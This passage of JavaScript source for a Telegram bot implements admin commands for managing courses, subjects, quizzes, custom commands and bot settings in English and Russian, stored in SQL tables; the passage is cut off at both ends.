            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            //Get all courses from the database
            var courses = settings.prepare(`SELECT * FROM courses_${locale}`).all();
            //If no courses are found, return
            if (courses.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_courses);
            }
            //Send a message with all courses
            var message = "";
            for (var i = 0; i < courses.length; i++) {
               var subjects = [];
               courses[i].subjects.split(",").forEach(subject => {
                  subject = parseInt(subject) + 1;
                  subjects.push(settings.prepare(`SELECT * FROM subjects_${locale} WHERE id = ?`).get(subject).name);
               });
               message += `${messages.messages.field_name}: ${courses[i].name}\n${messages.messages.field_subjects}: ${subjects.join(", ")}\n${messages.messages.field_score}: ${courses[i].min_score}\n${messages.messages.field_budget}: ${courses[i].budget}\n\n`;
            }
            return bot.sendMessage(chatId, message);
      }
   });
});

//Course Editor
bot.onText(/\/editcourse/, (msg, match) => {
   const chatId = msg.chat.id;
   var id = "";
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            //Get all courses from the database
            var courses = settings.prepare(`SELECT * FROM courses_${locale}`).all();
            //If no courses are found, return
            if (courses.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_courses);
            }
            //Create a keyboard with all courses
            var keyboard = [];
            for (var i = 0; i < courses.length; i++) {
               keyboard.push([{
                  text: courses[i].name,
                  callback_data: courses[i].name
               }]);
            }
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.editcourse_prompt, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (msg) => {
               switch (msg.data) {
                  case "cancel":
                     bot.sendMessage(chatId, messages.messages.cancelled);
                     break;
                  default:
                     //Check if the course is valid
                     var course = settings.prepare(`SELECT * FROM courses_${locale} WHERE name = ?`).get(msg.data);
                     if (course == undefined) {
                        return;
                     }
                     id = msg.data;
                     //Ask, which field to edit
                     bot.sendMessage(chatId, messages.messages.editcourse_field_prompt, {
                        reply_markup: {
                           inline_keyboard: [
                              [{
                                 text: messages.messages.field_name,
                                 callback_data: "name"
                              }],
                              [{
                                 text: messages.messages.field_subjects,
                                 callback_data: "subjects"
                              }],
                              [{
                                 text: messages.messages.field_score,
                                 callback_data: "min_score"
                              }],
                              [{
                                 text: messages.messages.field_budget,
                                 callback_data: "budget"
                              }],
                              [{
                                 text: messages.messages.cancel,
                                 callback_data: "cancel"
                              }]
                           ]
                        }
                     });
                     bot.once("callback_query", (msg) => {
                        switch (msg.data) {
                           case "cancel":
                              return bot.sendMessage(chatId, messages.messages.cancelled);
                           case "subjects":
                              //Get all subjects from the database
                              var subjects = settings.prepare(`SELECT * FROM subjects_${locale}`).all();
                              if (subjects.length <= 10) {
                                 bot.sendPoll(chatId, messages.messages.choose, subjects.map(subject => subject.name), {
                                    "allows_multiple_answers": true,
                                    "is_anonymous": false
                                 });
                                 bot.once("poll_answer", (msg) => {
                                    //Edit the subjects
                                    console.log(id);
                                    console.log(msg.option_ids.toString());
                                    settings.prepare(`UPDATE courses_${locale} SET subjects = ? WHERE name = ?`).run(msg.option_ids.toString(), id);
                                    return bot.sendMessage(chatId, messages.messages.course_edited);
                                 });
                              } else {
                                 var message = "";
                                 for (var i = 0; i < subjects.length; i++) {
                                    message += subjects[i].id + " - " + subjects[i].name + "\n";
                                 }
                                 bot.sendMessage(msg.from.id, message);
                                 bot.sendMessage(msg.from.id, messages.messages.input_subjects);
                                 bot.once("message", (msg) => {
                                    var options = msg.text.split(", ");
                                    var option_ids = [];
                                    options.forEach(option => {
                                       option = parseInt(option) - 1;
                                       option_ids.push(option);
                                    });
                                    //Edit the subjects
                                    settings.prepare(`UPDATE courses_${locale} SET subjects = ? WHERE name = ?`).run(option_ids.toString(), id);
                                    return bot.sendMessage(chatId, messages.messages.course_edited);
                                 });
                              }
                              break;
                           case "name":
                           case "min_score":
                           case "budget":
                              var query = `UPDATE courses_${locale} SET ${msg.data} = ? WHERE name = ?`;
                              bot.sendMessage(chatId, messages.messages.editcourse_value_prompt);
                              bot.once("message", (msg) => {
                                 if (msg.text == "/cancel") {
                                    return bot.sendMessage(chatId, messages.messages.cancelled);
                                 }
                                 //Edit the field
                                 settings.prepare(query).run(msg.text, id);
                                 return bot.sendMessage(chatId, messages.messages.course_edited);
                              });
                              break;
                           default:
                              break;
                        }
                     });
                     break;
               }
            });
            break;
         default:
            break;
      }
   });
});


//Subject commands: add, del, list
bot.onText(/\/addsubject/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            addsubject(msg.from.id, locale);
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/delsubject/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            var subjects = settings.prepare(`SELECT * FROM subjects_${locale}`).all();
            //If no subjects are found, return
            if (subjects.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_subjects);
            }
            //Create a keyboard with all subjects
            var keyboard = [];
            for (var i = 0; i < subjects.length; i++) {
               keyboard.push([{
                  text: subjects[i].name,
                  callback_data: subjects[i].id
               }]);
            }
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.delsubject_prompt, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (msg) => {
               switch (msg.data) {
                  case "cancel":
                     bot.sendMessage(chatId, messages.messages.cancelled);
                     break;
                  default:
                     //check if the subject is valid
                     var subject = settings.prepare(`SELECT * FROM subjects_${locale} WHERE id = ?`).get(msg.data);
                     if (subject == undefined) {
                        return;
                     }
                     //Check if subject is part of any course
                     var courses = settings.prepare(`SELECT * FROM courses_${locale}`).all();
                     var found = false;
                     for (var i = 0; i < courses.length; i++) {
                        var subjects = courses[i].subjects.split(",");
                        for (var j = 0; j < subjects.length; j++) {
                           if (subjects[j] == msg.data) {
                              found = true;
                           }
                        }
                     }
                     if (found) {
                        return bot.sendMessage(chatId, messages.messages.subject_in_course);
                     } else {
                        //Delete the subject
                        settings.prepare(`DELETE FROM subjects_${locale} WHERE id = ?`).run(msg.data);
                        return bot.sendMessage(chatId, messages.messages.subject_deleted);
                     }
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/listsubjects/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: 'en'
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: 'ru'
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            bot.sendMessage(chatId, messages.messages.cancelled);
            break;
         case "en":
         case "ru":
            var locale = msg.data;
            //Get all subjects from the database
            var subjects = settings.prepare(`SELECT * FROM subjects_${locale}`).all();
            //If no subjects are found, return
            if (subjects.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_subjects);
            }
            //Send a message with all subjects
            var message = "";
            for (var i = 0; i < subjects.length; i++) {
               message += subjects[i].name + "\n";
            }
            return bot.sendMessage(chatId, message);
      }
   });
});

bot.onText(/\/settings/, (msg, match) => {
console.log(getLocale(msg.from.id, defaultlang));
   if (msg.chat.type != "private") return;
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   //Unifies all of the commands into one
   var keyboard = [
      [{
         text: messages.messages.toggle,
         callback_data: "toggle"
      }],
      [{
         text: messages.messages.setwelcome,
         callback_data: "setwelcome"
      }],
      [{
         text: messages.messages.setfaq,
         callback_data: "setfaq"
      }],
      [{
         text: messages.messages.setbutton,
         callback_data: "setbutton"
      }],
      [{
         text: messages.messages.setwebsite,
         callback_data: "setwebsite"
      }],
      [{
         text: messages.messages.setlocale,
         callback_data: "setlocale"
      }],
      [{
         text: messages.messages.cancel,
         callback_data: "cancel"
      }]
   ];
   bot.sendMessage(chatId, messages.messages.settings_prompt, {
      reply_markup: {
         inline_keyboard: keyboard
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "setlocale":
               var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id) + '.json'));
               bot.sendMessage(msg.chat.id, messages.messages.locale_prompt, {
                  reply_markup: {
                     inline_keyboard: [
                        [{
                           text: messages.messages.locale_en,
                           callback_data: 'en'
                        }],
                        [{
                           text: messages.messages.locale_ru,
                           callback_data: 'ru'
                        }],
                        [{
                           text: messages.messages.cancel,
                           callback_data: "cancel"
                        }]
                     ]
                  }
               });
               bot.once('callback_query', (callbackQuery) => {
                  switch (callbackQuery.data) {
                     case "cancel":
                        return bot.sendMessage(callbackQuery.message.chat.id, messages.messages.cancelled);
                     case "en":
                     case "ru":
                        settings.prepare("UPDATE settings SET value = ? WHERE option = 'default_lang'").run(callbackQuery.data);
                        bot.sendMessage(msg.from.id, messages.messages.language_changed);
                        break;
                     default:
                        break;
                  }
               });
               break;
         case "toggle":
            bot.sendMessage(chatId, messages.messages.toggle_prompt, {
               "reply_markup": {
                  "inline_keyboard": [
                     [{
                        "text": messages.messages.calc_name,
                        "callback_data": "toggle_calculator"
                     }],
                     [{
                        "text": messages.messages.contact_name,
                        "callback_data": "toggle_contact"
                     }],
                     [{
                        "text": messages.messages.subscribe_name,
                        "callback_data": "toggle_subscribe"
                     }],
                     [{
                        "text": messages.messages.quiz_name,
                        "callback_data": "toggle_quiz"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once('callback_query', (callbackQuery) => {
               switch (callbackQuery.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "toggle_calculator":
                  case "toggle_contact":
                  case "toggle_subscribe":
                  case "toggle_quiz":
                     var option = callbackQuery.data.slice(7, callbackQuery.data.length);
                     console.log(option)
                     //Search for the option in the database
                     var value = settings.prepare("SELECT value FROM settings WHERE option = ?").get(option);
                     console.log(value.value);
                     if (value.value == "true") {
                        settings.prepare("UPDATE settings SET value = 'false' WHERE option = ?").run(option);
                        bot.answerCallbackQuery(callbackQuery.id, messages.messages.toggled_off);
                        bot.sendMessage(chatId, messages.messages.toggled_off);
                     } else {
                        settings.prepare("UPDATE settings SET value = 'true' WHERE option = ?").run(option);
                        bot.answerCallbackQuery(callbackQuery.id, messages.messages.toggled_on);
                        bot.sendMessage(chatId, messages.messages.toggled_on);
                     }
                     break;
                  default:
                     break;
               }
            });
            break;
         case "setwelcome":
            bot.sendMessage(chatId, messages.messages.locale_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.locale_en,
                        callback_data: "en"
                     }],
                     [{
                        text: messages.messages.locale_ru,
                        callback_data: "ru"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "en":
                  case "ru":
                     //Prompt for the message
                     bot.sendMessage(chatId, messages.messages.setwelcome_message_prompt);
                     bot.once("message", (msg) => {
                        if (msg.text == "/cancel") {
                           return bot.sendMessage(chatId, messages.messages.cancelled);
                        }
                        //Set the welcome message
                        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "welcome_text_" + callback.data);
                        return bot.sendMessage(chatId, messages.messages.welcome_message_set);
                     });
                     break;
                  default:
                     break;
               }
            });
            break;
         case "setfaq":
            bot.sendMessage(chatId, messages.messages.locale_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.locale_en,
                        callback_data: "en"
                     }],
                     [{
                        text: messages.messages.locale_ru,
                        callback_data: "ru"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "en":
                  case "ru":
                     //Prompt for the message
                     bot.sendMessage(chatId, messages.messages.setfaq_message_prompt);
                     bot.once("message", (msg) => {
                        if (msg.text == "/cancel") {
                           return bot.sendMessage(chatId, messages.messages.cancelled);
                        }
                        //Set the welcome message
                        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "faq_text_" + callback.data);
                        return bot.sendMessage(chatId, messages.messages.faq_message_set);
                     });
                     break;
                  default:
                     break;
               }
            });
            break;
         case "setbutton":
            bot.sendMessage(chatId, messages.messages.locale_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.locale_en,
                        callback_data: "en"
                     }],
                     [{
                        text: messages.messages.locale_ru,
                        callback_data: "ru"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "en":
                  case "ru":
                     //Prompt for the message
                     bot.sendMessage(chatId, messages.messages.button_text_prompt);
                     bot.once("message", (msg) => {
                        if (msg.text == "/cancel") {
                           return bot.sendMessage(chatId, messages.messages.cancelled);
                        }
                        //Set the welcome message
                        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "webbutton_text_" + callback.data);
                        var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
                        var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
                        if (website.value != "") {
                           bot.setChatMenuButton({
                              chat_id: msg.chat.id,
                              menu_button: JSON.stringify({
                                 type: "web_app",
                                 text: buttontext.value,
                                 web_app: {
                                    url: website.value
                                 }
                              })
                           })
                        }
                        return bot.sendMessage(chatId, messages.messages.button_text_set);
                     });
                     break;
                  default:
                     break;
               }
            });
            break;
         case "setwebsite":
            bot.sendMessage(chatId, messages.messages.locale_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.locale_en,
                        callback_data: "en"
                     }],
                     [{
                        text: messages.messages.locale_ru,
                        callback_data: "ru"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "en":
                  case "ru":
                     //Prompt for the message
                     bot.sendMessage(chatId, messages.messages.website_prompt);
                     bot.once("message", (msg) => {
                        if (msg.text == "/cancel") {
                           return bot.sendMessage(chatId, messages.messages.cancelled);
                        }
                        if (!msg.text.startsWith("https://")) {
                           //Telegram only accepts HTTPS sites as web apps
                           return bot.sendMessage(chatId, messages.messages.website_invalid);
                        }
                        //Set the welcome message
                        settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "website_link_" + callback.data);
                        var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
                        var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
                        if (website.value != "") {
                           bot.setChatMenuButton({
                              chat_id: msg.chat.id,
                              menu_button: JSON.stringify({
                                 type: "web_app",
                                 text: buttontext.value,
                                 web_app: {
                                    url: website.value
                                 }
                              })
                           })
                        }
                        return bot.sendMessage(chatId, messages.messages.website_set);
                     });
                     break;
                  default:
                     break;
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/addquiz/, (msg, match) => {
   var locale = "";
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(chatId, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: "en"
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: "ru"
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "en":
         case "ru":
            locale = callback.data;
            //Choose a provider
            bot.sendMessage(chatId, messages.messages.quiz_provider_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.quiz_provider_tg,
                        callback_data: "telegram"
                     }],
                     [{
                        text: messages.messages.quiz_provider_custom,
                        callback_data: "external"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "telegram":
                  case "external":
                     createquiz(callback.data, callback.from.id, locale);
                     break;
                  default:
                     break;
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/delquiz/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   var locale = "";
   //Prompt for locale
   bot.sendMessage(chatId, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: "en"
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: "ru"
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "en":
         case "ru":
            locale = callback.data;
            //List all the quizzes
            var quizzes = settings.prepare(`SELECT * FROM quizzes_${locale}`).all();
            console.log(quizzes);
            if (quizzes.length == 0) return bot.sendMessage(chatId, messages.messages.no_quizzes);
            var keyboard = [];
            quizzes.forEach(quiz => {
               console.log(quiz.name);
               keyboard.push([{
                  text: quiz.name,
                  callback_data: quiz.name
               }]);
            });
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.quiz_list, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  default:
                     //Check if the quiz exists
                     var quiz = settings.prepare(`SELECT * FROM quizzes_${locale} WHERE name = ?`).get(callback.data);
                     if (quiz == undefined) return;
                     //Get the quiz provider
                     var quiz = settings.prepare(`SELECT * FROM quizzes_${locale} WHERE name = ?`).get(callback.data);
                     if (quiz.provider == "telegram") {
                        //Delete the quiz from the database
                        settings.prepare(`DELETE FROM quizzes_interactive_${locale} WHERE name = ?`).run(callback.data);
                     }
                     settings.prepare(`DELETE FROM quizzes_${locale} WHERE name = ?`).run(callback.data);
                     return bot.sendMessage(chatId, messages.messages.quiz_deleted);
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/addcc/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   var string = "";
   var response = "";
   var link = "";
   bot.sendMessage(chatId, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: "en"
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: "ru"
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "en":
         case "ru":
            locale = callback.data;
            //Choose command type
            bot.sendMessage(chatId, messages.messages.cc_type_prompt, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.cc_type_text,
                        callback_data: "text"
                     }],
                     [{
                        text: messages.messages.cc_type_link,
                        callback_data: "link"
                     }],
                     [{
                        text: messages.messages.cancel,
                        callback_data: "cancel"
                     }]
                  ]
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  case "text":
                     //Ask for the name of the command
                     bot.sendMessage(chatId, messages.messages.cc_name_prompt);
                     bot.once("message", (callback) => {
                        if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                        string = callback.text;
                        bot.sendMessage(chatId, messages.messages.cc_text_prompt);
                        bot.once("message", (callback) => {
                           if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                           response = callback.text;
                           //Add the command to the database
                           settings.prepare(`INSERT INTO custom_commands_${locale} (type, string, response, link) VALUES (?, ?, ?, ?)`).run("text", string, response, "N/A");
                           return bot.sendMessage(chatId, messages.messages.cc_added);
                        });
                     });
                     break;
                  case "link":
                     //Ask for the name of the command
                     bot.sendMessage(chatId, messages.messages.cc_name_prompt);
                     bot.once("message", (callback) => {
                        if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                        string = callback.text;
                        bot.sendMessage(chatId, messages.messages.cc_text_prompt);
                        bot.once("message", (callback) => {
                           if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                           response = callback.text;
                           bot.sendMessage(chatId, messages.messages.cc_link_prompt);
                           bot.once("message", (callback) => {
                              if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                              if (!callback.text.startsWith("https://")) {
                                 //Telegram only accepts HTTPS sites as web apps
                                 return bot.sendMessage(chatId, messages.messages.website_invalid);
                              }
                              link = callback.text;
                              //Add the command to the database
                              settings.prepare(`INSERT INTO custom_commands_${locale} (type, string, response, link) VALUES (?, ?, ?, ?)`).run("link", string, response, link);
                              return bot.sendMessage(chatId, messages.messages.cc_added);
                           });
                        });
                     });
                     break;
                  default:
                     break;
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/delcc/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(chatId, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: "en"
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: "ru"
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "en":
         case "ru":
            var locale = callback.data;
            //Ask for the name of the command
            var keyboard = [];
            var custom_commands = settings.prepare(`SELECT * FROM custom_commands_${locale}`).all();
            if (custom_commands.length == 0) {
                return bot.sendMessage(chatId, messages.messages.no_customcommands);
            }
            custom_commands.forEach(custom_command => {
               keyboard.push([{
                  text: custom_command.string,
                  callback_data: custom_command.string
               }]);
            });
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.cc_select_prompt, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  default:
                     var cmd = settings.prepare(`SELECT * FROM custom_commands_${locale} WHERE string = ?`).get(callback.data);
                     if (cmd.string == undefined) return;
                     settings.prepare(`DELETE FROM custom_commands_${locale} WHERE string = ?`).run(callback.data);
                     return bot.sendMessage(chatId, messages.messages.cc_deleted);
               }
            });
            break;
         default:
            break;
      }
   });
});

bot.onText(/\/editcc/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (adminCheck(msg.from.id) == false) return;
   bot.sendMessage(chatId, messages.messages.locale_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.locale_en,
               callback_data: "en"
            }],
            [{
               text: messages.messages.locale_ru,
               callback_data: "ru"
            }],
            [{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]
         ]
      }
   });
   bot.once("callback_query", (callback) => {
      switch (callback.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         case "en":
         case "ru":
            var locale = callback.data;
            var keyboard = [];
            var custom_commands = settings.prepare(`SELECT * FROM custom_commands_${locale}`).all();
            if (custom_commands.length == 0) {
               return bot.sendMessage(chatId, messages.messages.no_customcommands);
            }
            custom_commands.forEach(custom_command => {
               keyboard.push([{
                  text: custom_command.string,
                  callback_data: custom_command.string
               }]);
            });
            keyboard.push([{
               text: messages.messages.cancel,
               callback_data: "cancel"
            }]);
            bot.sendMessage(chatId, messages.messages.cc_select_prompt, {
               reply_markup: {
                  inline_keyboard: keyboard
               }
            });
            bot.once("callback_query", (callback) => {
               switch (callback.data) {
                  case "cancel":
                     return bot.sendMessage(chatId, messages.messages.cancelled);
                  default:
                     var cmd = settings.prepare(`SELECT * FROM custom_commands_${locale} WHERE string = ?`).get(callback.data);
                     if (cmd.string == undefined) return;
                     switch (cmd.type) {
                        case "text":
                           bot.sendMessage(chatId, messages.messages.cc_edit_prompt, {
                              reply_markup: {
                                 inline_keyboard: [
                                    [{
                                       text: messages.messages.cc_edit_string,
                                       callback_data: "string"
                                    }],
                                    [{
                                       text: messages.messages.cc_type_text,
                                       callback_data: "text"
                                    }],
                                    [{
                                       text: messages.messages.cancel,
                                       callback_data: "cancel"
                                    }]
                                 ]
                              }
                           });
                           bot.once("callback_query", (callback) => {
                              switch (callback.data) {
                                 case "cancel":
                                    return bot.sendMessage(chatId, messages.messages.cancelled);
                                 case "string":
                                    bot.sendMessage(chatId, messages.messages.cc_edit_string_prompt);
                                    bot.once("message", (callback) => {
                                       if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                                       settings.prepare(`UPDATE custom_commands_${locale} SET string = ? WHERE string = ?`).run(callback.text, cmd.string);
                                       return bot.sendMessage(chatId, messages.messages.cc_edited);
                                    });
                                    break;
                                 case "text":
                                    bot.sendMessage(chatId, messages.messages.cc_edit_text_prompt);
                                    bot.once("message", (callback) => {
                                       if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                                       settings.prepare(`UPDATE custom_commands_${locale} SET response = ? WHERE string = ?`).run(callback.text, cmd.string);
                                       return bot.sendMessage(chatId, messages.messages.cc_edited);
                                    });
                                    break;
                                 default:
                                    break;
                              }
                           });
                           break;
                        case "link":
                           bot.sendMessage(chatId, messages.messages.cc_edit_prompt, {
                              reply_markup: {
                                 inline_keyboard: [
                                    [{
                                       text: messages.messages.cc_edit_string,
                                       callback_data: "string"
                                    }],
                                    [{
                                       text: messages.messages.cc_type_text,
                                       callback_data: "text"
                                    }],
                                    [{
                                       text: messages.messages.cc_type_link,
                                       callback_data: "link"
                                    }],
                                    [{
                                       text: messages.messages.cancel,
